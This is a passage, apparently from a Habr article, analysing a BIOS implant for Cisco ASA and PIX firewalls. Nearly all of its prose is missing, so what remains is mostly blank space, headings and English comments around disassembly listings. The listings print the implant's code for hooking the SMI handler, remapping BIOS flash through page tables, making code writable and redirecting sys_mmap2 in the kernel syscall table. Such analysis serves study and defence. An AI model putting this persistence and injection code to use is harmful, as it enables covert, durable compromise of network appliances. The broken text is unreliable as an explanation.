src="https://habrastorage.org/files/50d/472/fbc/50d472fbcf2d45c89c72ee3199afce73.png" alt="BIOS code before and after infection"></p><br><p>  <em>Hook</em> ' ‚Äì   <em>SMRAM</em>  <em>SMI</em> -  <em>SCA</em>       .     ,       ,  ,   <em>SMI</em>     . </p><br><p>  <em>Hook</em> 'a    <em>bin/asa5505/SCP28/asa5505_patchE18BF.bin</em> . </p><br><h2>   </h2><br><h3>   </h3><br><p>         <em>BIOS</em> '    <em>SMI</em>   <em>SMRAM</em> .     ,     ,          <em>SCA</em> .  ,   <em>SCA</em>       <em>#SMI</em> .   <a href="http://opensecuritytraining.info/IntroBIOS_files/Day1_07_Advanced%2520x86%2520-%2520BIOS%2520and%2520SMM%2520Internals%2520-%2520SMM.pdf"> </a> ,   <em>ICH/PCH</em>  <em>#SMI</em> , <em>SCA</em>   ,        .     <em>SCA</em>         ,     .  ,  -   , <em>SCA</em>       <em>#SMI</em> ,       : </p><br><pre> <code class="hljs pgsql">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> <span class="hljs-number"><span class="hljs-number">0x0A4</span></span> _exit: jmp far ptr <span class="hljs-number"><span class="hljs-number">0</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span> ; jmp address @ SMBASE + <span class="hljs-number"><span class="hljs-number">0x80A5</span></span> ; Has been replaced <span class="hljs-keyword"><span class="hljs-keyword">by</span></span> `mov word [<span class="hljs-number"><span class="hljs-number">0xc527</span></span>], cx` ; <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> CX contains the original SMI <span class="hljs-keyword"><span class="hljs-keyword">handler</span></span> EP <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> ; <span class="hljs-number"><span class="hljs-number">0x80A4</span></span> = <span class="hljs-number"><span class="hljs-number">0x8000</span></span> + (<span class="hljs-number"><span class="hljs-number">0xC527</span></span> - <span class="hljs-number"><span class="hljs-number">0xC480</span></span> = <span class="hljs-number"><span class="hljs-number">0xA5</span></span>) - <span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre> <br><p>          ,    ,   <em>#SMI</em>      <em>SCA</em> .     ,             ,     <em>SCA</em>         / . </p><br><p> , <em>SCA</em>     : </p><br><ul><li>   <em>(CR0.PM == 1)</em> ; </li><li>    <em>(CR0.PG == 1, CR3 != NULL)</em> ; </li><li>  <em>IDT/GDT</em> . </li></ul><br><pre> <code class="hljs vhdl">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0</span></span>x14D ; ... mov eax, fs:_ss_cr0 <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> eax, <span class="hljs-number"><span class="hljs-number">1</span></span> cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> jz <span class="hljs-keyword"><span class="hljs-keyword">wait</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> PM <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> enabled mov eax, fs:_ss_cr0 mov ebx, cr3 <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> eax, <span class="hljs-number"><span class="hljs-number">80000000</span></span>h cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> jz <span class="hljs-keyword"><span class="hljs-keyword">wait</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> PG <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> enabled cmp ebx, <span class="hljs-number"><span class="hljs-number">0</span></span> jz <span class="hljs-keyword"><span class="hljs-keyword">wait</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> cr3 <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> zero sidt fword ptr ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC5F7h ; _idt @ <span class="hljs-number"><span class="hljs-number">0</span></span>xC5F7 mov eax, ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC5F9h ; eax &lt;- IDT.Base cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> jz <span class="hljs-keyword"><span class="hljs-keyword">wait</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> IDT <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> initialized yet cmp byte ptr ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC5EFh, <span class="hljs-number"><span class="hljs-number">0</span></span> ; _setup_alarm @ <span class="hljs-number"><span class="hljs-number">0</span></span>xC5EF jz short stage_00 mov byte ptr ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC5EFh, <span class="hljs-number"><span class="hljs-number">0</span></span> ; _setup_alarm @ <span class="hljs-number"><span class="hljs-number">0</span></span>xC5EF push large <span class="hljs-number"><span class="hljs-number">0</span></span> ; a0 call large _setup_alarm_interrupt add esp, <span class="hljs-number"><span class="hljs-number">4</span></span> cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> jnz short stage_00 jmp restore_exit ; ...</code> </pre> <br><p>    ,  /         ,  ,   . </p><br><h3>    </h3><br><p>       :      <em>SP Main</em>         <em>SP Main</em>    ,   BIOS Flash. </p><br><p>   <em>SCA</em>  ,        ‚Äì  ASA   PIX.              . </p><br><p>        <em>BootLdr</em> ,     <em>0x100000</em> (        <em>0x100000</em> ). </p><br><p>      8 MiB ‚Äì     PIX,      ASA. </p><br><pre> <code class="hljs cs">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0xD6E</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> __cdecl _fca_inject_stage1(<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a0, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> a1, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> cr3, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> cr4, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> zero) ; ... mov dword ptr [esp], <span class="hljs-number"><span class="hljs-number">100000</span></span>h ; malina bootloader real time va call large va2pa test eax, eax jz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> guess_lina cmp eax, <span class="hljs-number"><span class="hljs-number">100000</span></span>h ; malina bootloader <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> located @ VA <span class="hljs-number"><span class="hljs-number">0x100000</span></span> PA <span class="hljs-number"><span class="hljs-number">0x100000</span></span> jnz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> guess_lina mov [ebp+var_C], <span class="hljs-number"><span class="hljs-number">100000</span></span>h mov eax, [ebp+var_C] cmp [eax+grub_aout32_header.a_midmag], <span class="hljs-number"><span class="hljs-number">107</span></span>h ; bootloader magic jnz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> guess_lina mov eax, [ebp+var_C] cmp [eax+grub_aout32_header.a_text], <span class="hljs-number"><span class="hljs-number">7F</span></span>FFFFh ; bootloader + malina size jbe <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> guess_lina ; can<span class="hljs-string"><span class="hljs-string">'t be lass than 8 MiB ; ... jmp guess_malina ; ...</span></span></code> </pre> <br><h3>     malina (PIX) </h3><br><p>   ,          ,  , ASA     <em>lina</em> ,          <em>malina</em> .    ,    <em>SP Main</em> ,       (      ),      ,        <em>malina</em> . </p><br><p>   , <em>SCA</em>    BIOS Flash     .   <em>SCA</em>      <em>Page Directory</em> ,    <em>Page Table</em>   4- MiB 32-   ( <em>BIOS Flash Map</em> ). </p><br><p>  <em>Page Table Entry</em>   ,         <em>user space</em>    <em>BIOS Flash Map</em> . </p><br><pre> <code class="hljs cs">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0x24B</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> __<span class="hljs-function"><span class="hljs-function">cdecl </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">map_bios_flash_manually</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> cr3, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> cr4</span></span></span><span class="hljs-function">)</span></span> ; ... mov eax, [ebp+cr3] ; ... and eax, <span class="hljs-number"><span class="hljs-number">0F</span></span>FFFF000h ; eax &lt;- paging directory lea ebx, [eax+<span class="hljs-number"><span class="hljs-number">0F</span></span>FCh] ; last pd entry addr mov edx, [eax+<span class="hljs-number"><span class="hljs-number">0F</span></span>FCh] ; last pd entry <span class="hljs-keyword"><span class="hljs-keyword">value</span></span> ; ... mov eax, edx or eax, <span class="hljs-number"><span class="hljs-number">2</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> pde permissions to RW mov [ebx], eax ; write PDE back mov esi, <span class="hljs-number"><span class="hljs-number">1</span></span> mov edi, <span class="hljs-number"><span class="hljs-number">0</span></span> mov ebx, edx and ebx, <span class="hljs-number"><span class="hljs-number">0F</span></span>FFFF000h ; ebx &lt;- PT pa loc_DD2B5: mov edx, <span class="hljs-number"><span class="hljs-number">0F</span></span>FF00000h loc_DD2BB: lea ecx, [edx+<span class="hljs-number"><span class="hljs-number">7</span></span>] ; ecx &lt;- <span class="hljs-number"><span class="hljs-number">0xFFF00007</span></span> mov eax, edx and eax, <span class="hljs-number"><span class="hljs-number">3F</span></span>F000h ; eax &lt;- <span class="hljs-number"><span class="hljs-number">0x300000</span></span> shr eax, <span class="hljs-number"><span class="hljs-number">0</span></span>Ah ; eax &lt;- <span class="hljs-number"><span class="hljs-number">0xC00</span></span> lea eax, [ebx+eax] ; eax &lt;- PTE pa which <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> PT pa + <span class="hljs-number"><span class="hljs-number">0xC00</span></span> test esi, esi jz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> loc_DD2DD test <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span> ptr [eax], <span class="hljs-number"><span class="hljs-number">1</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> present? jnz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> _exit_err loc_DD2DD: mov [eax], ecx ; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> PTE <span class="hljs-keyword"><span class="hljs-keyword">value</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edx, <span class="hljs-number"><span class="hljs-number">1000</span></span>h ; move to next page cmp edx, <span class="hljs-number"><span class="hljs-number">0F</span></span>FF80000h ; done? jnz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> loc_DD2BB <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edi, <span class="hljs-number"><span class="hljs-number">1</span></span> mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span> cmp edi, <span class="hljs-number"><span class="hljs-number">2</span></span> jnz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> loc_DD2B5 mov eax, cr3 mov cr3, eax mov eax, <span class="hljs-number"><span class="hljs-number">1</span></span> jmp <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> _exit_ok ; ...</code> </pre> <br><p>  <em>SCA</em>      ,       <em>55 53 65 57</em> ,    <em>push ebp, ebx, esi, edi</em> .    <em>malina</em>       (        7.2.2  PIX): </p><br><pre> <code class="hljs perl">; <span class="hljs-string"><span class="hljs-string">`pix722.bin/malina.bin`</span></span> @ <span class="hljs-number"><span class="hljs-number">0x100110</span></span> _td_ctx_enter proc near ; CODE XREF: sub_11389<span class="hljs-number"><span class="hljs-number">0</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>F4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebp ; the search pattern is <span class="hljs-string"><span class="hljs-string">`55 53 56 57`</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> esi <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi mov eax, ds:<span class="hljs-number"><span class="hljs-number">13</span></span>A8E80h mov edx, [eax+<span class="hljs-number"><span class="hljs-number">1</span></span>Ch] mov [eax+<span class="hljs-number"><span class="hljs-number">1</span></span>Ch], esp mov esp, edx mov ebp, [eax+<span class="hljs-number"><span class="hljs-number">20</span></span>h] mov ebx, [eax+<span class="hljs-number"><span class="hljs-number">24</span></span>h] mov esi, [eax+<span class="hljs-number"><span class="hljs-number">28</span></span>h] mov edi, [eax+<span class="hljs-number"><span class="hljs-number">2</span></span>Ch] retn _td_ctx_enter endp</code> </pre> <br><p>    <em>_td_ctx_enter</em>   <em>_td_ctx_exit</em> ,    <em>SCA</em>   : </p><br><pre> <code class="hljs perl">; <span class="hljs-string"><span class="hljs-string">`pix722.bin/malina.bin`</span></span> @ <span class="hljs-number"><span class="hljs-number">0x100130</span></span> _td_ctx_exit proc near ; CODE XREF: sub_1131B<span class="hljs-number"><span class="hljs-number">0</span></span>:loc_1131DD mov eax, ds:<span class="hljs-number"><span class="hljs-number">13</span></span>A8E80h mov edx, [eax+<span class="hljs-number"><span class="hljs-number">1</span></span>Ch] mov [eax+<span class="hljs-number"><span class="hljs-number">1</span></span>Ch], esp mov esp, edx mov [eax+<span class="hljs-number"><span class="hljs-number">20</span></span>h], ebp mov [eax+<span class="hljs-number"><span class="hljs-number">24</span></span>h], ebx mov [eax+<span class="hljs-number"><span class="hljs-number">28</span></span>h], esi mov [eax+<span class="hljs-number"><span class="hljs-number">2</span></span>Ch], edi <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> edi <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> esi <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> ebx <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> ebp retn _td_ctx_exit endp</code> </pre> <br><p>        . </p><br><p> ,           "duart_open", "malloc"  "CHECKHEAPS...", <em>SCA</em>    <em>malloc</em>  <em>checkheaps</em> .  <em>malloc</em>       <em>FCA</em>  <em>FUA</em>  BIOS Flash  RAM.  <em>checkheaps</em>    ,   ,  <em>SCA</em>      : </p><br><pre> <code class="hljs perl">; <span class="hljs-string"><span class="hljs-string">`bin/asa5505/SCP28/asa5505_patchEC480.bin`</span></span> offset <span class="hljs-number"><span class="hljs-number">0x357</span></span> ;... lea eax, ds:0DC60Dh ; _td_ctx_ptr @ <span class="hljs-number"><span class="hljs-number">0xC60D</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> eax ; td_ctx_ptr call large _find_td_ctx_enter add esp, <span class="hljs-number"><span class="hljs-number">4</span></span> cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> ; eax &lt;- _td_ctx_enter() ptr jz clear_alarm_restore_exit mov ds:0DC5FDh, eax ; _td_ctx_enter_ptr @ <span class="hljs-number"><span class="hljs-number">0xC5FD</span></span> mov edx, fs:dword_DFFF<span class="hljs-number"><span class="hljs-number">0</span></span> mov ebx, eax mov ecx, <span class="hljs-number"><span class="hljs-number">1</span></span>Ch add ebx, ecx cmp edx, eax jb short loc_DC39A cmp edx, ebx jnb short loc_DC39A add eax, <span class="hljs-number"><span class="hljs-number">20</span></span>h ; <span class="hljs-string"><span class="hljs-string">' '</span></span> ; calculate _td_ctx_exit addr loc_DC39A: mov ds:0DC609h, eax ; _td_ctx_exit_ptr @ <span class="hljs-number"><span class="hljs-number">0xC609</span></span> call large _find_malloc cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> jz clear_alarm_restore_exit mov ds:0DC601h, eax ; _malloc_ptr @ <span class="hljs-number"><span class="hljs-number">0xC601</span></span> mov ebx, ds:0DC609h ; _td_ctx_exit_ptr @ <span class="hljs-number"><span class="hljs-number">0xC609</span></span> mov ecx, 0Bh add ebx, ecx ; ebx = <span class="hljs-number"><span class="hljs-number">0x10013B</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">sub</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function">, </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ebx</span></span></span><span class="hljs-function"> </span></span>; calculate malloc offset relative to call insn address lea edx, ds:0DC611h ; _splice_pci_43 @ <span class="hljs-number"><span class="hljs-number">0xC611</span></span> mov [edx+<span class="hljs-number"><span class="hljs-number">7</span></span>], eax ; call <span class="hljs-number"><span class="hljs-number">0x12345678</span></span> ; ^^^^^^^^^^ &lt;- eax = malloc() ptr mov eax, cr4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> eax mov eax, cr3 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> eax call large _make_malina_text_rwx add esp, <span class="hljs-number"><span class="hljs-number">8</span></span> cmp eax, <span class="hljs-number"><span class="hljs-number">0</span></span> jz clear_alarm_restore_exit call large _patch_checkheaps ;...</code> </pre> <br><p> ,    <em>checkheaps</em> , <em>SCA</em>      ,     ,  ,    .  <em>SCA</em>     <em>_td_ctx_exit</em> : </p><br><pre> <code class="hljs lua">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0x404</span></span> ;... lea edi, ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC62Dh ; _td_ctx_exit_code @ <span class="hljs-number"><span class="hljs-number">0xC62D</span></span> mov esi, ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC609h ; _td_ctx_exit_ptr @ <span class="hljs-number"><span class="hljs-number">0xC609</span></span> mov ecx, <span class="hljs-number"><span class="hljs-number">24</span></span>h ; <span class="hljs-string"><span class="hljs-string">'$'</span></span> <span class="hljs-built_in"><span class="hljs-built_in">rep</span></span> movs <span class="hljs-built_in"><span class="hljs-built_in">byte</span></span> ptr es:[edi], <span class="hljs-built_in"><span class="hljs-built_in">byte</span></span> ptr [esi] mov edi, ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC609h ; _td_ctx_exit_ptr @ <span class="hljs-number"><span class="hljs-number">0xC609</span></span> lea esi, ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC611h ; _splice_pci_43 @ <span class="hljs-number"><span class="hljs-number">0xC611</span></span> mov ecx, <span class="hljs-number"><span class="hljs-number">1</span></span>Ch <span class="hljs-built_in"><span class="hljs-built_in">rep</span></span> movs <span class="hljs-built_in"><span class="hljs-built_in">byte</span></span> ptr es:[edi], <span class="hljs-built_in"><span class="hljs-built_in">byte</span></span> ptr [esi] wbinvd mov <span class="hljs-built_in"><span class="hljs-built_in">byte</span></span> ptr ds:<span class="hljs-number"><span class="hljs-number">0</span></span>DC5F0h, <span class="hljs-number"><span class="hljs-number">1</span></span> ; _main_proc_infected @ <span class="hljs-number"><span class="hljs-number">0xC5F0</span></span>, <span class="hljs-number"><span class="hljs-number">0x0000</span></span> ;...</code> </pre> <br><p>   : </p><br><pre> <code class="hljs vhdl">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0</span></span>x611 ;... pushal push <span class="hljs-number"><span class="hljs-number">0</span></span>x10000 call malloc ; allocate <span class="hljs-number"><span class="hljs-number">64</span></span> KiB <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> FCA <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> FUA push eax ; pass ptr <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> allocated memory via stack mov dx, <span class="hljs-number"><span class="hljs-number">0</span></span>xcf8 mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span>x800078d0 <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> dx, eax add edx, <span class="hljs-number"><span class="hljs-number">4</span></span> mov al, <span class="hljs-number"><span class="hljs-number">0</span></span>x43 <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> dx, al ; pass control back <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> SCA ;...</code> </pre> <br><p>    64 KiB   <em>FCA</em>  <em>FUA</em> ,       <em>SCA</em>   <em>#SMI</em> ,     <em>FCA</em>  <em>FUA</em>   . </p><br><p>    , <em>SCA</em>     ,      <em>_td_ctx_exit</em>     <em>SP Main</em> .     ,    <em>0x25E</em>     <em>FCA</em> . </p><br><p>       : </p><br><p><img src="https://habrastorage.org/files/76b/f35/b37/76bf35b37031499f806babf3b05646b0.png" alt="General scheme of the process of penetration into malina"></p><br><p>     <em>SP Main</em> .   ,    ,  ,  <em>SP Main</em> ‚Äì     <em>SUA (userarea)</em> . </p><br><p>     <em>SP Main</em>     <em>userarea</em> ,   <em>FUA</em> .  ,     , <em>SP Main</em>        ‚Äì     .   , <em>SP Main</em>     "  ",        . </p><br><h3>     lina (ASA) </h3><br><p>   ,  <em>SCA</em>   :     <em>SP Main</em>    BIOS Flash  <em>user space</em> .       ‚Äì       <em>mmap2</em>   <em>syscall_table</em> .         ,        <em>SCA</em>       ,      . </p><br><p>   <em>syscall_table</em>     <a href="">sysenter_entry</a> ,     <em>int 0x80</em> (syscall).  <em>int 0x80</em>    <em>IDT</em> ,     0x400   <em>IDT</em> . </p><br><pre> <code class="hljs vbscript">; `bin/asa5505/SCP28/asa5505_patchEC480.bin` offset <span class="hljs-number"><span class="hljs-number">0x82F</span></span> ; <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> __cdecl _fca_inject_lina(<span class="hljs-built_in"><span class="hljs-built_in">int</span></span> a0, <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> a1, <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> cr3, <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> cr4, <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> zero, <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> idt_base) ; ... mov eax, [ebp+idt_base] mov [esp], eax ; va <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> large _va2pa test eax, eax ; eax = IDT phys addr jz exit_bad mov edx, [eax+<span class="hljs-number"><span class="hljs-number">404</span></span>h] ; <span class="hljs-number"><span class="hljs-number">0x404</span></span> ‚Äì <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> <span class="hljs-number"><span class="hljs-number">0x80</span></span> interrupt descriptor offset LO part mov dx, <span class="hljs-number"><span class="hljs-number">0</span></span> movzx eax, word ptr [eax+<span class="hljs-number"><span class="hljs-number">400</span></span>h] ; <span class="hljs-number"><span class="hljs-number">0x400</span></span> ‚Äì <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> <span class="hljs-number"><span class="hljs-number">0x80</span></span> interrupt descriptor offset LO part mov ebx, edx <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> ebx, eax ; ebx &lt;- <span class="hljs-built_in"><span class="hljs-built_in">int</span></span> <span class="hljs-number"><span class="hljs-number">128</span></span> handler va ; ... <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> large _va2pa mov [ebp+int80_handler_pa], eax ; ... mov edx, [ebp+int80_handler_pa] cmp byte ptr [edx], <span class="hljs-number"><span class="hljs-number">0</span></span>FFh ; ff <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">85</span></span> xx xx xx xx <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> dword ds:xxxxxxxx[eax*<span class="hljs-number"><span class="hljs-number">4</span></span>] ; which stands <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> `<span class="hljs-keyword"><span class="hljs-keyword">call</span></span> *sys_call_table(,%eax,<span class="hljs-number"><span class="hljs-number">4</span></span>)` ; see sysenter_entry() at `arch/i386/kernel/entry.S` jnz short loop2_cont cmp byte ptr [edx+<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-number"><span class="hljs-number">14</span></span>h jnz short loop2_cont cmp byte ptr [edx+<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-number"><span class="hljs-number">85</span></span>h ; ... mov eax, [edx+<span class="hljs-number"><span class="hljs-number">3</span></span>] ; ff <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">85</span></span> xx xx xx xx <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> dword ds:xxxxxxxx[eax*<span class="hljs-number"><span class="hljs-number">4</span></span>] ; ^^^^^^^^^^^ -&gt; eax = syscall_table VA add eax, <span class="hljs-number"><span class="hljs-number">300</span></span>h ; <span class="hljs-number"><span class="hljs-number">300</span></span>h <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> sys_mmap2 handler ptr offset relative <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> syscall_table base mov [esp+_va], eax <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> large va2pa mov [ebp+sys_mmap2_pa], eax ; ... mov ebx, [ebp+orig_sys_mmap2_handler_va] mov edi, [ebp+kernel_rm_code_pa] mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span>FFF60000h ; FCA flash address mov ecx, <span class="hljs-number"><span class="hljs-number">87</span></span>h ; SP sys_mmap2 code size rep movs byte ptr es:[edi], byte ptr [esi] ; it <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> safe <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> store SP sys_mmap2 code ; <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> the kernel real-mode part of code ; <span class="hljs-comment"><span class="hljs-comment">'cause by the time the sys_mmap2 will be called ; that code will not be called anymore mov edx, [ebx] mov eax, [ebp+kernel_rm_code_pa] mov [eax+83h], edx ; store original sys_mmap2 VA in far jump ; so that SP sys_mmap2 could actually use it mov eax, [ebp+kernel_rm_ep] mov ecx, [ebp+sys_mmap2_handler_ptr_pa] mov [ecx], eax ; modify sys_mmap2 handler ptr within syscall_table ; to make it point to SP sys_mmap2 mov eax, 0DCEC3h ; remember original sys_mmap2 VA for when SCA finishes it work ; it could restore the original handler ptr within syscall_table ; ... mov eax, 1 ; success jmp short exit_ok ; ...</span></span></code> </pre> <br><p>  ,  ""   "":      <em>mmap2</em> " "   user space-,      .    <em>mmap2</em>               .   <em>SCA</em>    BIOS Flash, ,         <em>/dev/mem</em> .  ,  ,   <em>mmap2</em>      <em>/dev/mem</em>   <em>0xFF000</em>  ‚Äì  <em>lina</em> . </p><br><pre> <code class="hljs perl">// <span class="hljs-regexp"><span class="hljs-regexp">/tmp/asa</span></span>831-k8-rootfs/asa/bin/lina @ <span class="hljs-number"><span class="hljs-number">0x8AE9A10</span></span> //... fd = primary_rom_fd; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!primary_rom_fd){ fd = fopen(<span class="hljs-string"><span class="hljs-string">"/dev/mem"</span></span>, <span class="hljs-string"><span class="hljs-string">"r+"</span></span>); primary_rom_fd = fd; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!fd){ <span class="hljs-keyword"><span class="hljs-keyword">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Error opening %s\n"</span></span>, <span class="hljs-string"><span class="hljs-string">"/dev/mem"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } _fileno = fileno(fd); *(_DWORD *)(a2 - <span class="hljs-number"><span class="hljs-number">20</span></span>) = <span class="hljs-number"><span class="hljs-number">0</span></span>; *(_DWORD *)(a2 - <span class="hljs-number"><span class="hljs-number">16</span></span>) = <span class="hljs-number"><span class="hljs-number">0xFFC00000</span></span> / *(_DWORD *)(a2 - <span class="hljs-number"><span class="hljs-number">32</span></span>); _primary_rom = sys_mmap2(*(void **)(a2 - <span class="hljs-number"><span class="hljs-number">20</span></span>), <span class="hljs-number"><span class="hljs-number">0x80000</span></span>u, <span class="hljs-number"><span class="hljs-number">3</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, _fileno, *(_DWORD *)(a2 - <span class="hljs-number"><span class="hljs-number">20</span></span> + <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (_primary_rom &gt; <span class="hljs-number"><span class="hljs-number">0xFFFFFF7E</span></span>){ *__errno_location() = -_primary_rom; LABEL_4: perror(<span class="hljs-string"><span class="hljs-string">"mmap: error mapping primary rom"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } //...</code> </pre> <br><p>     , <em>lina</em>  -      512 KiB BIOS Flash.   ,       <em>FCA, FUA</em>  <em>SUA</em> ,        1 MiB    <em>mmap2</em> ,            .            <em>lina</em> . </p><br><p>       <em>SP Main</em> .      ,    <em>mmap2</em>    , ,          /, ,   ,        <em>SCA</em>   <em>#SMI</em> . </p><br><pre> <code class="hljs kotlin">; `bin/asa5505/SCP28/asa5505_patch60000.bin` offset <span class="hljs-number"><span class="hljs-number">0x063</span></span> ; ... push eax ; eax &lt;- mapped address mov dx, <span class="hljs-number"><span class="hljs-number">0</span></span>CF8h mov eax, <span class="hljs-number"><span class="hljs-number">800078</span></span>D0h <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> dx, eax mov dx, <span class="hljs-number"><span class="hljs-number">0</span></span>CFCh mov al, <span class="hljs-number"><span class="hljs-number">42</span></span>h ; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span> will signal SCE 